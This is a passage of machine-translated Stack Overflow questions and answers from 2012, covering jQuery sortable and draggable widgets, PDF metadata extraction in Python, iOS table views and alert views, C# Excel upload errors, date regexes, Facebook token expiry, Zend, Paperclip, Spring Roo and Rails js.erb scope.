它会完美地工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:01:37.583

与您的问题无关，稍微修改一下您的代码可能会更干净。

```
$('#divMain').empty()
    .append( $('<div>').addClass('column column_1') )
    .append( $('<div>').addClass('column column_2') )
    .append( $('<div>').addClass('column column_3') );

$('.column').sortable({
    tolerance   : 'pointer',
    connectWith : '.column'
});

for (var j = 1, i; j <= 3; j++) {
    for (i = 0; i <= 2; i++) {
        $('<div>').addClass('widget widget_' + i)
            .append( $('<div>').addClass('widget_header widget_header_' + i) )
            .append( $('<div>').addClass('widget_sub_header widget_sub_header_' + i) )
            .append( $('<div>').addClass('widget_content widget_content_' + i) )
            .append( $('<div>').addClass('widget_footer widget_footer_' + i) )
            .appendTo('.column_' + j);
    }
} 
```

# python - PDF“高级”信息提取

> ID：13287546
> 
> 赞同：0
> 
> 时间：2012-11-08T10:49:55.527
> 
> 标签：python, pdf, fonts, colors, dpi

我正在尝试编写或多或少地解释 PDF 软证明的内容。

我想提取一些信息，但不知道如何提取。

我需要提取的内容：

```
Bleed:                    I got this somewhat working with pyPdf, given
                          that the document uses 72 dpi, which sadly isn't
                          always the case. I need to be able to calculate
                          the bleed in millimeters.

Print resolution (dpi):   If I read the PDF spec[1] correctly this ought to
                          always be 72 dpi, unless a page has UserUnit set,
                          which was only introduced in PDF-1.6, but shouldn't
                          print documents always be at least 300 dpi? I'm
                          afraid that I misunderstood something…

                          I'd also need the print resolution for images, if
                          they can differ from the default page resolution,
                          that is.

Text color:               I don't have the slightest clue on how to extract
                          this, the string 'text colour' only shows up once
                          in the whole spec, without any explanation how it
                          is set.

Image colormodel:         If I understand it correctly I can read this out
                          in pyPdf with page['/Group']['/CS'] which can be:
                           - /DeviceRGB
                           - /DeviceCMY
                           - /DeviceCMYK
                           - /DeviceGray
                           - /DeviceRGBK
                           - /DeviceN

Font 'embeddedness':      I read in another post on stackoverflow that I
                          can just iterate over the font resources and if a
                          resource has a '/FontFile'-key that means that
                          the font is embedded. Is this correct? 
```

如果 pyPdf 以外的其他库能够更好地提取此信息（或它们的组合），那么它们将受到欢迎。到目前为止，我摸索着使用 pyPdf、pdfrw 和 pdfminer。所有这些都没有最广泛的文档。

[1] [http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:30:57.297

> 如果我正确阅读了 PDF 规范[1](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf)，这应该始终为 72 dpi，除非页面设置了 UserUnit，这仅在 PDF-1.6 中引入，但打印文档不应该始终至少为 300 dpi？恐怕我误会了什么……</p>

你确实误解了一些东西。默认用户空间单位默认为 1/72 英寸，但自 PDF-1.6 以来可以在每页基础上更改，它**没有**定义打印分辨率，它仅定义用户默认给出的坐标单位的长度（即除非任何尺寸变化的转换处于活动状态）对应。

为了打印，所有数据都被转换为一个设备相关空间，其分辨率与用户空间坐标无关。打印分辨率取决于打印设备及其驱动程序；由于安全设置仅允许低质量打印，它们可能会受到限制。

> 我还需要图像的打印分辨率，如果它们可以不同于默认的页面分辨率，也就是说。

图像（嗯，位图图像，在 PDF 中也有矢量图形）具有各自的分辨率，然后可以在渲染之前进行转换（例如放大）。因此，对于“图像打印分辨率”，您必须检查每个位图图像以及插入它的每个页面内容。如果图像被旋转、倾斜和不对称拉伸，我想知道你将使用什么数字作为分辨率......；）

> 文本颜色：我对如何提取这一点一无所知，字符串“文本颜色”在整个规范中只出现一次，没有任何解释它是如何设置的。

[查看规范](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf)中的第 9.2.3 节：

> 用于绘制字形的颜色应为图形状态下的当前颜色：非描边颜色或描边颜色（或两者），取决于文本渲染模式（参见 9.3.6，“文本渲染模式”）。默认颜色应为黑色（在 DeviceGray 中），但在绘制字形之前，可以通过执行一个或多个适当的颜色设置运算符（参见 8.6.8，“颜色运算符”）来获得其他颜色。

在那里，您可以找到许多指向有趣部分的指针。但是请注意，文本不仅仅是彩色的；它也可以呈现为应用于任何背景的剪辑路径。

> 我在 stackoverflow 上的另一篇文章中读到，我可以迭代字体资源，如果资源具有“/FontFile”键，则表示字体已嵌入。这个对吗？

我建议进行更精确的分析。还有其他相关的键，例如“/FontFile2”和“/FontFile3”，必须使用正确的键。

不要低估您的任务...您应该开始定义您搜索的属性在旋转、拉伸和倾斜字形、矢量图形和位图图像（如 PDF）的混合环境中的含义。

# ios - 如何从作为子类的 uitableview 推送 uiviewcontroller

> ID：13287554
> 
> 赞同：0
> 
> 时间：2012-11-08T10:50:09.827
> 
> 标签：ios, uitableview, uinavigationcontroller

我有一个`UIViewController`，我在其中添加了一个子类`UITableView`作为子视图。

例如

```
 @interface ViewController : UIViewController

    @interface ItemList : UITableView 
```

在`ViewController` `viewDidLoad`我创建一个`ItemList`( `itemList`) 对象并将其添加到`viewcontroller`

```
- (void)viewDidLoad {
 ...
  [self.view addSubview:itemList];
} 
```

其中`didSelectRowAtIndexPath`一个我无权访问导航控制器，那么我如何将另一个`ItemList`推到？`UITableView``viewcontroller``navigationcontroller`

```
@implementation ItemList
{
 ...
    - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

        [self.navigationController pushViewController:newViewControllerobject animated:YES];

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:57:52.433

创建一个属性，例如：`ViewController *mydelegate`在 itemList 类中。当您在 ViewController 中添加 itemList 时，`viewDidLoad`添加以下内容

```
 itemList.myDelegate = self; 
```

继续前进..on 确实选择了

```
 @implementation ItemList
@synthesize mydelegate;
    {
     ...
        - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

            [myDelegate.navigationController pushViewController:newViewControllerobject animated:YES];

        }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:32:42.790

如果您在 AppDelegate 中定义了第一个 navigationController，您可以使用以下代码找到最上面的 navigationController，然后将 viewController 推送到它上面。

```
AppDelegate *appDelegate = (AppDelegate*)[[UIApplication sharedApplication]delegate];
[appDelegate.navigationController.visibleViewController.navigationController pushViewController:newViewControllerobject animated:YES]; 
```

# c# - 上传 Excel “外部表格不是预期的格式。”

> ID：13287557
> 
> 赞同：0
> 
> 时间：2012-11-08T10:50:27.037
> 
> 标签：c#, .net, excel

```
 protected void imgButtonSearchProperty_Click(object sender, EventArgs e)
 {
    try
    {
        if (FileUpload1.HasFile)
        {
            lblmsg.Visible = false;
            GridView2.DataSource = null;
            GridView2.DataBind();
            GridView2.Visible = false;
            string FileName = Path.GetFileName(FileUpload1.PostedFile.FileName);
            AppLog.Log("The name of the file is " + FileName);
            string Extension = Path.GetExtension(FileUpload1.PostedFile.FileName);
            AppLog.Log("The name of the extension is " + Extension);
            string FolderPath = ConfigurationManager.AppSettings["FolderPath"];
            AppLog.Log("The name of the FolderPath is " + FolderPath);
            string FilePath = Server.MapPath(FolderPath + "\\" + FileName);
            AppLog.Log("The name of the FilePath is " + FilePath);
            FileUpload1.SaveAs(FilePath);
            Import_To_Grid(FilePath, Extension);
        }
    }
    catch (Exception ex)
    {

    }
}
 private void Import_To_Grid(string FilePath, string Extension)
{
    try
    {
        string conStr = "";
        switch (Extension)
        {
            case ".xls": //Excel 97-03
                conStr = ConfigurationManager.ConnectionStrings["Excel03ConString"].ConnectionString;
                break;
            case ".xlsx": //Excel 07
                conStr = ConfigurationManager.ConnectionStrings["Excel07ConString"].ConnectionString;
                break;
        }
        conStr = String.Format(conStr, FilePath, 1);
        OleDbConnection connExcel = new OleDbConnection(conStr);
        OleDbCommand cmdExcel = new OleDbCommand();
        OleDbDataAdapter oda = new OleDbDataAdapter();
        cmdExcel.Connection = connExcel;
        connExcel.Open();
        DataTable dtExcelSchema;
        dtExcelSchema = connExcel.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, null);
        string SheetName = dtExcelSchema.Rows[0]["TABLE_NAME"].ToString();
        //dSUploadInventory.Tables.Add(dtExcelSchema);
        connExcel.Close();

        //Read Data from First Sheet
        connExcel.Open();
        cmdExcel.CommandText = "SELECT * From [" + SheetName + "]";
        oda.SelectCommand = cmdExcel;
        oda.Fill(dt);
        connExcel.Close();

        ////To
        string expression = string.Empty;
        expression = "ISNULL(PropertyId,0)=0";
        DataRow[] rows = dt.Select(expression);

        if (rows.Length > 0)
        {
            foreach (DataRow row in rows)
            {
                row.Delete();
                row.AcceptChanges();
            }
        }
        ////To Do
        ViewState["ExcelData"] = dt;

        GridView1.DataSource = dt;
        GridView1.DataBind();
        if (dt.Rows.Count > 0)
        {
            imgButtonSubmit.Visible = true;
        }
    }
    catch (Exception ex)
    {

    }

} 
```

我在 web.config 文件中使用的连接字符串是：

```
<add name="Excel03ConString" connectionString="Provider=Microsoft.Jet.OLEDB.4.0;Data      
Source={0};Extended Properties='Excel 8.0;HDR={1}'" /> 
<add name="Excel07ConString" connectionString="Provider=Microsoft.ACE.OLEDB.12.0;Data 
Source={0};Extended Properties='Excel 12.0;HDR={1}'" /> 
```

当我尝试使用上述代码上传 excel 时，出现以下错误：

```
“External table is not in the expected format.” 
```

我已经添加了连接字符串帮助将不胜感激。

# uitableview - iOS 6.0- UIAlertView 添加子视图失败。在较低版本中工作正常

> ID：13287558
> 
> 赞同：0
> 
> 时间：2012-11-08T10:50:28.320
> 
> 标签：uitableview, ios6, uialertview, addsubview

*这是我在警报视图中显示表格视图的代码。它在 iOS 5.1 中完美运行。但在 iOS 6.0 中，它不会在警报视图中显示表格视图。*

**UIAlertTableView.h**

```
#import <UIKit/UIKit.h>

@class UIAlertView;

@interface UIAlertTableView : UIAlertView {
    // The Alert View to decorate
    UIAlertView *alertView;

    // The Table View to display
    UITableView *tableView;

    // Height of the table
    int tableHeight;

    // Space the Table requires (incl. padding)
    int tableExtHeight;

    id<UITableViewDataSource> dataSource;
    id<UITableViewDelegate> tableDelegate;

    NSArray *names;
    NSArray *prices;
    NSString *priceText;
    NSInteger rowsCount;
    NSInteger total;
}

@property (nonatomic, assign) id dataSource;
@property (nonatomic, assign) id tableDelegate;

@property (nonatomic, readonly) UITableView *tableView;
@property (nonatomic, assign) int tableHeight;
@property (nonatomic, assign) NSInteger total;

- (void)prepare;

@end 
```

**UIAlertTableView.m**

```
#import "UIAlertTableView.h"

#define kTablePadding 8.0f

@interface UIAlertView (private)
- (void)layoutAnimated:(BOOL)fp8;
@end

@implementation UIAlertTableView

@synthesize dataSource;
@synthesize tableDelegate;
@synthesize tableHeight;
@synthesize tableView;

@synthesize total;

- (void)layoutAnimated:(BOOL)fp8 {
    [super layoutAnimated:fp8];
    [self setFrame:CGRectMake(self.frame.origin.x, self.frame.origin.y - tableExtHeight/2, self.frame.size.width, self.frame.size.height + tableExtHeight)];

    // We get the lowest non-control view (i.e. Labels) so we can place the table view just below
    UIView *lowestView;
    int i = 0;
    while (![[self.subviews objectAtIndex:i] isKindOfClass:[UIControl class]]) {
        lowestView = [self.subviews objectAtIndex:i];
        i++;
    }

    CGFloat tableWidth = 262.0f;

    tableView.frame = CGRectMake(11.0f, lowestView.frame.origin.y + lowestView.frame.size.height + 2 * kTablePadding, tableWidth, tableHeight);

    for (UIView *sv in self.subviews) {
        // Move all Controls down
        if ([sv isKindOfClass:[UIControl class]]) {
            sv.frame = CGRectMake(sv.frame.origin.x, sv.frame.origin.y + tableExtHeight, sv.frame.size.width, sv.frame.size.height);
        }
    }

}

- (void)show{
    self.total = 0;
    [self prepare];
    [super show];
}

- (NSInteger)tableView:(UITableView *)alerttableView numberOfRowsInSection:(NSInteger)section
{
/*
code to show some app data in rows
    //    NSMutableDictionary *rowsUponDict = [AppDelegate productsPFObjectDictionaryAppDelegate];
    NSMutableArray *productsNames = [AppDelegate productsPFObjectDictionaryNamesAppDelegate];

    //    rowsCount = [[rowsUponDict allKeys] count];
    rowsCount = [productsNames count];
    NSLog(@"rowsUponDict count: %d",rowsCount);
    return rowsCount+1;
*/
return 1;
}

- (UITableViewCell *)tableView:(UITableView *)alerttableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *CellIdentifier = @"LazyTableCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle
                                       reuseIdentifier:CellIdentifier] autorelease];
        cell.selectionStyle = UITableViewCellSelectionStyleBlue;
    }

/*
code to show some app data in rows

    if (indexPath.row == rowsCount) {
        cell.textLabel.text = @"Total Amount:";
        cell.detailTextLabel.text = [NSString stringWithFormat:@"%d",self.total];
    }
    else {
        cell.textLabel.text = [names objectAtIndex:indexPath.row];
        priceText = [NSString stringWithFormat:@"%@", [prices objectAtIndex:indexPath.row]];
        cell.detailTextLabel.text = [NSString stringWithFormat:@"Rs.%@",priceText];
    }
*/

    return cell;
}

- (void)prepare {
    if (tableHeight == 0) {
        tableHeight = 250.0f;
    }
    /*
calculation os some app data

    NSInteger priceInt;
    names = [[NSArray alloc] initWithArray:[AppDelegate productsPFObjectDictionaryNamesAppDelegate]];
    NSLog(@"Names: %@",names);
    prices = [[NSArray alloc] initWithArray:[AppDelegate productsPFObjectDictionaryPricesAppDelegate]];
    NSLog(@"prices: %@",prices);

    for (int i=0; i<[prices count]; i++) {
        priceText = [NSString stringWithFormat:@"%@", [prices objectAtIndex:i]];
        priceInt = [priceText integerValue];
        self.total = self.total + priceInt;
        NSLog(@"tatal: %d",self.total);
    }
    */
    tableExtHeight = tableHeight + 2 * kTablePadding;

    tableView = [[UITableView alloc] initWithFrame:CGRectMake(0.0f, 0.0f, 0.0f, 0.0f) style:UITableViewStylePlain];
    tableView.delegate = tableDelegate;
    tableView.dataSource = dataSource;

    [self addSubview:tableView];
//  [self insertSubview:tableView atIndex:0];

    [self setNeedsLayout];
}

- (void)dealloc {
    [tableView release];
    [super dealloc];
}

@end 
```

**这就是我使用它的方式**

```
UIAlertTableView *popUpCartItems = [[UIAlertTableView alloc] initWithTitle:@"Cart" message:nil delegate:self cancelButtonTitle:@"Close" otherButtonTitles:@"CheckOut",nil];
popUpCartItems.tableDelegate = popUpCartItems;
popUpCartItems.dataSource = popUpCartItems;
popUpCartItems.tableHeight = 132;
[popUpCartItems show]; 
```

任何帮助是极大的赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T05:39:05.653

检查以下链接

[https://github.com/simonb/SBTableAlert](https://github.com/simonb/SBTableAlert)

我在 iOS 5.0 和 iOS 6.0 上都进行了测试，它非常适合我。

您只需要下载该代码并在您的项目中使用。

希望对你有帮助 ！！！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:12:00.643

在将它添加到 UIAlertView 之前，尝试为您的 tableview 设置一个框架。可能如下。

```
tableView.frame = CGRectMake(0, 0, 280, 100);
[self addSubview:tableView]; 
```

# javascript - jquery可拖动用于多个部门

> ID：13287562
> 
> 赞同：0
> 
> 时间：2012-11-08T10:50:36.620
> 
> 标签：javascript, jquery, html

Drag 在第一个分区中正常工作，但在下一个分区中不能正常工作。我需要在不更改 div Id/Class 名称的情况下让它工作。

小提琴在这里：[JS Fiddle](http://jsfiddle.net/daneuchar/zHyA9/23/)

HTML：

```
<div class="track">
    <div id="rocket">    
    </div>
</div>
<br><br><div style="clear:both">
<div class="track">
    <div id="rocket">    
    </div>
</div>

​ 
```

CSS：

```
.track {
    height: 400px;
    width: 48px;
    overflow: hidden;
    margin: 10px 0 0 10px;
    float:left;
    background: #ccc;
}
#rocket{
    height:48px;
    width:48px;
    background: url('http://cdn1.iconfinder.com/data/icons/Symbolicons_Transportation/48/Rocket.png');
    position:relative;
    top:352px;
}
​ 
```

查询：

```
$(document).ready(function() {
    $('.track').each(function(){

    //rocket drag
    $(this).children("#rocket").draggable({
        containment: ".track",
        axis: "y",
        scroll: false,
        start: function(event, ui) {
            draggingRocket = true;
        },
        drag: function(event, ui) {
            // Show the current dragged position of image

        },
        stop: function(event, ui) {
            draggingRocket = false;
        }
    });
    });
});​ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:06:18.383

这是小提琴...

[http://jsfiddle.net/zHyA9/30/](http://jsfiddle.net/zHyA9/30/)

1) id 应该始终是唯一的...因此将您的 id 更改为 class..
2) 添加 `containment: $(this),`到您的可拖动类中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:03:25.203

您需要在 html 代码中更改一些内容。

```
<div class="track">
<div id="rocket">    
</div>
</div>
<div style="clear:both">
<div class="track">
<div id="rocket">    
</div>
</div> 
```

这里的小提琴：[小提琴](http://jsfiddle.net/sselvamani22/zHyA9/27/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:07:51.060

您需要对`html`代码进行一些更改`js`。

参考这个[小提琴](http://jsfiddle.net/zHyA9/26/)。

JS: $(document).ready(function() { $('.track').live("hover",function(){

```
//rocket drag
$(this).children(".rocket").draggable({
    containment: this,
    axis: "y",
    scroll: false,
    start: function(event, ui) {
        draggingRocket = true;
    },
    drag: function(event, ui) {
        // Show the current dragged position of image

    },
    stop: function(event, ui) {
        draggingRocket = false;
    }
});
}); 
```

});​</p>

# regex - 日、月文本输入：月部分的智能正则表达式？

> ID：13287563
> 
> 赞同：0
> 
> 时间：2012-11-08T10:50:38.680
> 
> 标签：regex

我在 UI 上有一个日期输入控件。它会在输入数字时自动完成日期。

目前使用：

```
\d{1,2}(\.|\/|-)\d{1,2} 
```

[在http://regexpal.com/](http://regexpal.com/)上进行测试以查看它是否正常工作。

基本上是 1 位或 2 位数字，后跟 ./- 之一，以及 1 位或 2 位数字。例如 01/9、1/2、1/1，将匹配

我想要做什么（但不能！）：

**如果第二组数字（月份部分）是 0 或 1，则需要另一个数字**

**如果第二组数字是 2-9，则匹配**

基本上就是这样，谢谢

布赖恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:54:49.647

正则表达式中的数字范围有点烦人，应该在验证格式时在单独的步骤中完成。但这里是正则表达式：

```
\d{1,2}[/.-](0?[2-9]|1[0-2]|01|1[/.-]) 
```

这应该符合所有要求（包括评论中的要求）。可能的月份：

```
2, 3, ..., 9
01, 02, 03, ..., 09
10, 11, 12
1/, 1., 1- 
```

# facebook - 代表用户发帖到 Facebook：如何处理令牌过期？

> ID：13287568
> 
> 赞同：1
> 
> 时间：2012-11-08T10:50:54.090
> 
> 标签：facebook, oauth-2.0

我正在网站上实现与 Facebook/Twitter/... 的连接功能。这个想法是，一旦用户将他的帐户与外部服务连接起来，我们的网站就可以代表用户发布消息。

使用 Twitter 没有问题，因为 OAuth access_token 不会过期。但是对于 FB，它确实每两个月到期一次，当用户注销、更改密码或明确取消对应用程序的授权时。

我应该如何处理令牌过期？对我来说，如果我可以在不打扰用户的情况下自动刷新令牌将是理想的，但除非我错过了一些东西，否则似乎没有任何方法可以做到这一点。所以，现在我有两个想法：

*   不那么尴尬的方式：每次用户登录网站时检查令牌是否已过期，并通知用户她也重新授权了应用程序。
*   更尴尬的方式：每次在我们的网站中触发“发布到社交网络”事件时，检查令牌是否已过期并要求用户重新授权。

第一个选项对用户来说更容易实现和更清晰。

那么，你是如何处理这种情况的呢？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:27:52.327

我想我会尝试第一个选项：

*   用户登录
*   服务器检查用户是否已经拥有 Facebook 令牌，如果有：
*   检查它是否仍然是有效的令牌。[http://developers.facebook.com/docs/howtos/login/debugging-access-tokens/](http://developers.facebook.com/docs/howtos/login/debugging-access-tokens/)
*   如果令牌过期不是因为用户取消了应用程序的授权，而是因为其他情况我们将用户重定向到 OAuth 端点。

如果还有更多内容，我会尝试并更新此答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T14:17:09.513

如果用户实际上正在与您的网站进行交互，那么您应该会获得新鲜感`access_token`（请阅读下文）。如果您使用 Facebook API 执行与用户相关的*离线*任务，那么您应该存储`access_token`它们及其到期日期。然后您需要处理过期的访问令牌并要求用户再次与您的应用程序交互并更新您的记录。

你应该参考这个[文件](https://developers.facebook.com/docs/howtos/login/debugging-access-tokens/#step3)。您还应该阅读[扩展访问令牌文档](https://developers.facebook.com/docs/howtos/login/extending-tokens/)：

> **步骤 2\. 刷新长期用户访问令牌**
> 
> 在任何时候，您都可以通过重复原始身份验证流程，获取新的短期令牌，然后执行与上述相同的交换*来生成新的长期令牌。*在某些情况下，这个较新的长寿命令牌可能与前一个令牌相同，但我们不保证这是真的，您的应用程序不应依赖它。

# php - findManyToManyRowset 排除列

> ID：13287573
> 
> 赞同：2
> 
> 时间：2012-11-08T10:51:13.997
> 
> 标签：php, zend-framework

如何从 findManyToManyRowset() 方法结果中排除列？

```
$servers = $this->findManyToManyRowset(
                'Serverlog_Model_DbTable_Computer', 
                'Serverlog_Model_DbTable_Server'); 
```

$servers->toArray() 给了我：

```
object(Serverlog_Model_Rowset_Computer)#458 (10) {
["_data":protected] => array(5) {
[0] => array(27) {
  ["id"] => int(462)
  ["name"] => string(10) "test"
  ["key"] => string(0) ""
  ["keyboard"] => int(1)
  ["mouse"] => int(0)
  ["serial_nr"] => string(10) "test"
  ["status"] => int(1)      
} 
```

我试图重载继承自 Zend_Db_Table_Rowset_Abstract 和 Zend_Db_Table_Row_Abstract 的方法 toArray()，但没有任何改变。

```
class Serverlog_Model_DbTable_Computer extends My_DbTable_Model {

  protected $_name = 'computers';
  protected $_dependentTables = array('Serverlog_Model_DbTable_Server');
  protected $_rowClass = 'Serverlog_Model_Row_Computer';
  protected $_rowsetClass = 'Serverlog_Model_Rowset_Computer';  

class Serverlog_Model_Rowset_Computer extends Zend_Db_Table_Rowset_Abstract {
public function toArray() {
    foreach ($this->_rows as $i => $row) {
        $this->_data[$i] = array($row->_data['id'] => $row->_data['name']);
    }
    return $this->_data;
}

class Serverlog_Model_Row_Computer extends Zend_Db_Table_Row_Abstract {
 public function toArray() {
    return array($this->_data['id'] => $this->_data['name']);
}  
} 
```

我想从 $servers->toArray() 得到结果：

```
object(Serverlog_Model_Rowset_Computer)#458 (10) {
["_data":protected] => array(5) {
[0] => array(27) {
  ["id"] => int(462)
  ["name"] => string(10) "test"  
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T15:19:44.800

行对象是 DbTable 行结构的反射表示。能够从 Row 对象中排除字段是矛盾的行为。

# ruby-on-rails-3 - 回形针图像大小符号

> ID：13287575
> 
> 赞同：7
> 
> 时间：2012-11-08T10:51:16.537
> 
> 标签：ruby-on-rails-3, image, amazon-s3, paperclip

一开始在我看来，这似乎是一个错误的类型，但现在当我看到更多的例子时，我意识到它不是......

我懂了`:thumb => "300x300>"`

或者`:thumb => "100x100#"`

乃至`:thumb => "180"`

这些是什么意思？我在哪里可以找到该符号的解释？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-08T10:55:01.927

在开发它的[git 存储库](https://github.com/thoughtbot/paperclip/wiki/Thumbnail-Generation)上。从那里复制的解释：

**调整大小选项**

默认行为是调整图像大小并保持纵横比（即 300×150 图像的 :medium 版本将是 200×100）。一些常用的选项是：

*   尾随 #，缩略图将被集中裁剪，以确保请求的尺寸。
*   尾随 >，缩略图仅在当前请求的尺寸较大时才会被修改。（即 :small thumb 用于 120×80 原始图像将保持不变）

# aop - 如何确保 Spring roo 生成的方面是由依赖项目编织的？

> ID：13287581
> 
> 赞同：2
> 
> 时间：2012-11-08T10:51:28.223
> 
> 标签：aop, aspectj, spring-roo, compile-time-weaving

我有一个 Spring Roo**多模块项目**。我注意到在另一个项目中包含包含我的域模型的 jar/模块后，这些方面没有被编织**，让我得到没有任何可用 getter/setter 的域类**。

**如何确保 Spring roo 生成的方面是由依赖项目编织的？**

**编辑**：为了能够在另一个项目中使用 Roo 的方面，需要在依赖项目中包含 aspectJ 插件。请注意，这种方式不需要编译时加载。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-15T21:23:40.980

您需要在 pom 中包含 aspectj maven 插件：

```
 <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>aspectj-maven-plugin</artifactId>
            <version>1.4</version>
            <!-- NB: do not use 1.3 or 1.3.x due to MASPECTJ-90 and do not use 1.4
                due to declare parents issue -->
            <dependencies>
                <!-- NB: You must use Maven 2.0.9 or above or these are ignored (see
                    MNG-2972) -->
                <dependency>
                    <groupId>org.aspectj</groupId>
                    <artifactId>aspectjrt</artifactId>
                    <version>${aspectj.version}</version>
                </dependency>
                <dependency>
                    <groupId>org.aspectj</groupId>
                    <artifactId>aspectjtools</artifactId>
                    <version>${aspectj.version}</version>
                </dependency>
            </dependencies>
            <executions>
                <execution>
                    <goals>
                        <goal>compile</goal>
                        <goal>test-compile</goal>
                    </goals>
                    <!-- NB: force aspect compile before normal compile, required for 1.3+
                        see: MASPECTJ-13, MASPECTJ-92 -->
                    <phase>process-sources</phase>
                </execution>
            </executions>
            <configuration>
                <outxml>true</outxml>
                <aspectLibraries>
                    <aspectLibrary>
                        <groupId>org.springframework</groupId>
                        <artifactId>spring-aspects</artifactId>
                    </aspectLibrary>
                </aspectLibraries>
                <source>${java.version}</source>
                <target>${java.version}</target>
            </configuration>
        </plugin> 
```

# objective-c - NSInvalidArgumentException'，原因：'-[__NSCFString isFileURL]：无法识别的选择器发送到实例 0x712e450'

> ID：13287587
> 
> 赞同：11
> 
> 时间：2012-11-08T10:51:57.040
> 
> 标签：objective-c, ios, xcode, ios5, ios4

我是 iPhone 应用程序开发的新手。

当我运行一个示例项目时，我做了一个解析`xml`提要并在表格视图中显示内容和图像的方法，我收到了这个错误 -

```
"NSInvalidArgumentException', reason: '-[__NSCFString isFileURL]: unrecognized selector sent to instance 0x712e450'" 
```

仅当我尝试在`UITableViewCell`.

我用于从中获取图像的代码`url`是 -

```
if([elementName isEqualToString:IMAGE])
{
    NSURL *imageUrl = [attributeDict objectForKey:@"url"];
    NSData *imageData = [NSData dataWithContentsOfURL:imageUrl];
    bbc.image = [UIImage imageWithData:imageData];        
} 
```

where`bbc`是一个`class(NSObject subclass)`用于存储解析内容的对象。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-11-08T10:56:13.847

我认为您正在使用`NSString`as `NSURL`。尝试这个：

```
 NSURL *imageUrl =[NSURL URLWithString:[attributeDict objectForKey:@"url"]]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:55:49.790

看起来“url”实际上是一个`NSString`，而不是一个`NSURL`对象。自己将其转换为`NSURL`对象：

```
if ([elementName isEqualToString:IMAGE])
{
    NSString *urlStr = [attributeDict objectForKey:@"url"];
    NSURL *imageUrl = [NSURL URLWithString:urlStr];
    NSData *imageData = [NSData dataWithContentsOfURL:imageUrl];
    bbc.image = [UIImage imageWithData:imageData];        
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:55:59.240

imageURL 不是一个 NSURL，而是一个字符串。

# javascript - js.erb 文件中 Ruby 代码的范围是什么以及它如何访问控制器变量

> ID：13287588
> 
> 赞同：0
> 
> 时间：2012-11-08T10:51:55.413
> 
> 标签：javascript, ruby-on-rails, ruby, ruby-on-rails-3, erb

我有一个 js.erb 文件，我想在其中使用asset_path。它包含在这样的视图中：

```
<%= javascript_include_tag "resources/gallery_resource" %> 
```

当资产路径是自包含的时，这可以正常工作，但是我需要使用资产路径内的控制器（@resource）中定义的变量：

```
element.image = "<%= asset_path 'resources/galleries/'+@resource.uid+'/'+index+'.jpg' %>" 
```

没有定义@resource 的问题。那么，如果这段 Ruby 代码无法访问控制器，那么它的范围是什么？我应该如何在这里提供变量？

*我了解如何使 Javascript 可以访问该变量，但我想让它对嵌入式 Ruby 可用。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:05:05.060

您需要将其呈现为部分，并将资源作为本地传递：

```
<script>
  <%= render :partial => 'resources/gallery_resource', :locals => { :resource => @resource } %>
</script> 
```

此外，在gallery_resource.js.erb 文件中，您需要将@resource 更改为仅资源：

```
element.image = "<%= asset_path 'resources/galleries/'+resource.uid+'/'+index+'.jpg' %>" 
```

如果这在任何其他操作中呈现，它们还需要在 :locals 散列中传递 :resource 值。

js.erb 文件的范围取决于以下几点：

*   如果控制器本身正在渲染文件，那么它可以访问实例变量（如“@resource”）。如果 view/viewtype/show.js.erb 存在并且浏览器请求了 js 响应类型，就会出现这种情况。就像使用 .html.erb 文件一样。
*   如果它被呈现为部分，那么唯一的范围就是你通过 :locals 散列传递的内容。这些不是实例变量，而是局部变量，因此它们被这样引用（如“资源”）。
*   另一方面，使用 javascript_include_tag 在 HTML 中创建一个直接引用 JS 文件的标记。如果您真的只需要包含一些不可变的 javascript，这没关系。这些要么必须在您的 app/assets/ 目录或您的 public/ 目录下的某个位置。

app/assets 或 public/ 中的文件**无法**访问单个请求中的变量——它们要么不被编译（public/），要么只预编译一次（app/assets）。

据推测，有问题的文件当前位于您的 app/assets 目录中。为了将其呈现为部分，请将其移动到 views/ 目录下的某个位置，在名称前面放置一个下划线 (_)：

```
app/views/resources/_gallery_resource.js.erb 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T12:18:18.783

作为记录，我对这个问题的解决方案是使用令牌获取基本路径：

```
var base_path = "<%= asset_path 'resources/galleries/{{X}}.jpg' %>"; 
```

[然后使用出色的gon gem](https://github.com/gazay/gon)使用控制器变量替换令牌

```
var imagePathFragment = gon.resource.uid+'/'+(index+1);
